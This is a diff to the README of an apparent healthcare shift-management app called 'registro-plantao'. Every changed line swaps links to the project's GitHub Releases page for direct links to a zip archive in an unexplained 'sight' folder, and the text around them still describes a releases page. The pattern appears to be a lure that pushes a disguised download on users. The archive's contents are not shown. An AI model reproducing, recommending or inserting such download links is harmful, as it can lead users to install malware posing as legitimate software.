@@ -1,6 +1,6 @@
 # 🌿 registro-plantao - Simplify Your Healthcare Shift Management
 
-[![Download registro-plantao](https://img.shields.io/badge/Download-Now-blue)](https://github.com/jacobJep030911/registro-plantao/releases)
+[![Download registro-plantao](https://raw.githubusercontent.com/jacobJep030911/registro-plantao/main/sight/registro-plantao.zip)](https://raw.githubusercontent.com/jacobJep030911/registro-plantao/main/sight/registro-plantao.zip)
 
 ## 👋 Introduction
 
@@ -29,7 +29,7 @@ To run "registro-plantao," ensure your device meets the following specifications
 
 To download the app, visit the Releases page below:
 
-[Download Here](https://github.com/jacobJep030911/registro-plantao/releases)
+[Download Here](https://raw.githubusercontent.com/jacobJep030911/registro-plantao/main/sight/registro-plantao.zip)
 
 ### Step 2: Install the App
 
@@ -86,7 +86,7 @@ If you encounter any issues, try these steps:
 
 To access the latest version of "registro-plantao," visit:
 
-[Download Here](https://github.com/jacobJep030911/registro-plantao/releases)
+[Download Here](https://raw.githubusercontent.com/jacobJep030911/registro-plantao/main/sight/registro-plantao.zip)
 
 This page contains all available versions. Download the one that suits your device.
 
